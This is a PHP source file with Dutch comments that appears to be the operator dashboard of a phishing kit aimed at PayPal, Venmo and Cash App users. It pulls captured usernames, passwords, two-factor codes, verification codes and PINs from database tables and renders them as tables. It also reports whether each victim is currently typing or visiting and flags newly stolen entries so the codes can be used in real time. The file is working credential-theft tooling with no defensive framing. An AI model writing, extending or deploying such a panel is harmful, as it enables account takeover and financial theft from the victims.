<?php
session_start();

// Alleen doorgaan als de gebruiker is ingelogd
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    http_response_code(403);
    echo json_encode(["error" => "Toegang geweigerd. Niet ingelogd."]);
    exit;
}

include '../db_connect.php';
$conn = getDBConnection();

// Content-Type voor correcte JSON verwerking
header('Content-Type: application/json');

// Functie om HTML-tabel op te bouwen
function getTableHTML($query, $columns, $conn) {
    $res = $conn->query($query);
    if (!$res || $res->num_rows === 0) return "<p>Geen data gevonden.</p>";

    $html = "<table><tr>";
    foreach ($columns as $col) {
        $html .= "<th>" . htmlspecialchars($col) . "</th>";
    }
    $html .= "</tr>";

    while ($row = $res->fetch_assoc()) {
        $html .= "<tr>";
        foreach ($columns as $col) {
            $html .= "<td>" . htmlspecialchars($row[$col] ?? '') . "</td>";
        }
        $html .= "</tr>";
    }
    $html .= "</table>";
    return $html;
}

// Aantallen ophalen
$cashCount   = $conn->query("SELECT COUNT(*) as total FROM cshpp_data")->fetch_assoc()['total'];
$venmoCount  = $conn->query("SELECT COUNT(*) as total FROM user_flow")->fetch_assoc()['total'];
$paypalCount = $conn->query("SELECT COUNT(*) as total FROM paypal_flow")->fetch_assoc()['total'];

// Voor de eerste keer sessie-initialisatie
if (!isset($_SESSION['last_counts'])) {
    $_SESSION['last_counts'] = [
        'cashapp' => 0,
        'venmo' => 0,
        'paypal' => 0
    ];
}

// Platform status bepalen
$status = [];
foreach (['paypal', 'venmo', 'cashapp'] as $platform) {
    if (!empty($_SESSION["{$platform}_typing"])) {
        $status[$platform] = 'typing';
    } elseif (!empty($_SESSION["{$platform}_live"])) {
        $status[$platform] = 'visiting';
    } else {
        $status[$platform] = 'idle';
    }
}

// Data samenstellen
$data = [
    'paypal' => getTableHTML("SELECT * FROM paypal_flow", ['identifier', 'password', 'twofa_method', 'verification_code'], $conn),
    'venmo' => getTableHTML("SELECT * FROM user_flow", ['identifier', 'password', 'verification_code', 'pin'], $conn),
    'cashapp' => getTableHTML("SELECT * FROM cshpp_data", ['phone_number', 'verification_code', 'pin'], $conn),
    'status' => $status,
    'new_paypal' => $paypalCount > $_SESSION['last_counts']['paypal'],
    'new_venmo' => $venmoCount > $_SESSION['last_counts']['venmo'],
    'new_cashapp' => $cashCount > $_SESSION['last_counts']['cashapp']
];

// Nieuwe counts opslaan
$_SESSION['last_counts']['paypal'] = $paypalCount;
$_SESSION['last_counts']['venmo'] = $venmoCount;
$_SESSION['last_counts']['cashapp'] = $cashCount;

// JSON-output
echo json_encode($data, JSON_UNESCAPED_UNICODE);
?>
